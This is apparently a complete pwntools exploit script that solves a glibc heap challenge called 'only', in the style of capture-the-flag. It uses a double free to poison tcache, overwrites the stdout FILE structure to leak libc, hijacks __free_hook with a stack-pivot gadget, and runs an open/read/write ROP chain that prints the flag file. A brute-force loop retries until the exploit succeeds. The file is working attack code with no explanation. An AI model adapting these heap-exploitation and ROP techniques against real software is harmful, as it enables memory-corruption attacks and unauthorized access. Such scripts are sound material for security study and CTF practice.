from pwn import*
context(os='linux',arch='amd64',log_level='debug')

#s = process('./only')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def init(size):
	s.sendlineafter(b'Choice >> ', b'0')
	s.sendlineafter(b'Size:', str(size))

def add(size,content):
	s.sendlineafter(b'Choice >> ', b'1')
	s.sendlineafter(b'Size:', str(size))
	s.sendafter(b'Content:', content)

def delete():
	s.sendlineafter(b'Choice >> ', b'2')
def exp():
	add(0xe0, b'a\n')
	delete()
	s.sendlineafter(b'Choice >> ', b'0')
	delete()

	add(0xe0, b'\xf0\x97\n')
	add(0xe0, b'\xf0\x97\n')
	add(0xe0, p64(0) + p64(0x491) + b'\x00\x98\n')

	add(0x60, b'\n')
	delete()
	add(0x30, b'\xa0\xc6\n')
	add(0x60, b'\n')

	payload = p64(0xfbad1887) + p64(0)*3 + b'\x00\n'
	add(0x60, payload)

	libc_base = u64(s.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) - 0x1ec980
	success('libc_base=>' + hex(libc_base))

	magic_gadget1 = libc_base + 0x0000000000151990
	# mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
	magic_gadget2 = libc_base + 0x000000000005b4d0
	# mov rsp, rdx; ret;

	__free_hook = libc_base + libc.sym['__free_hook']

	pop_rdi_ret = libc_base + 0x0000000000023b6a
	pop_rsi_ret = libc_base + 0x000000000002601f
	pop_rdx_ret = libc_base + 0x0000000000142c92

	payload = p64(0)*5 + p64(0x81) + p64(__free_hook) + b'\n'
	add(0xe0, payload)

	add(0x70, p64(0) + b'\n')

	payload = p64(magic_gadget1) + p64(__free_hook+0x10) + p64(libc_base + libc.sym['gets']) + p64(0)*3 + p64(magic_gadget2) + b'\n'

	add(0x70, payload)

	#gdb.attach(s)
	#pause()

	delete()

	payload = p64(0)*2 + b'./flag\x00\x00'
	payload+= p64(pop_rdi_ret) + p64(__free_hook+0x10) + p64(pop_rsi_ret) + p64(0) + p64(pop_rdx_ret) + p64(0) + p64(libc_base + libc.sym['open'])
	payload+= p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(__free_hook) + p64(pop_rdx_ret) + p64(0x30) + p64(libc_base + libc.sym['read'])
	payload+= p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(__free_hook) + p64(pop_rdx_ret) + p64(0x30) + p64(libc_base + libc.sym['write'])

	s.sendline(payload)
if __name__ == "__main__":
	while True:
		try:
			s = process('./only',timeout=1)
			exp()
			ss = s.recv()
			assert(b'flag' in ss)
			print(ss)
			s.interactive()
		except Exception:
			s.close()

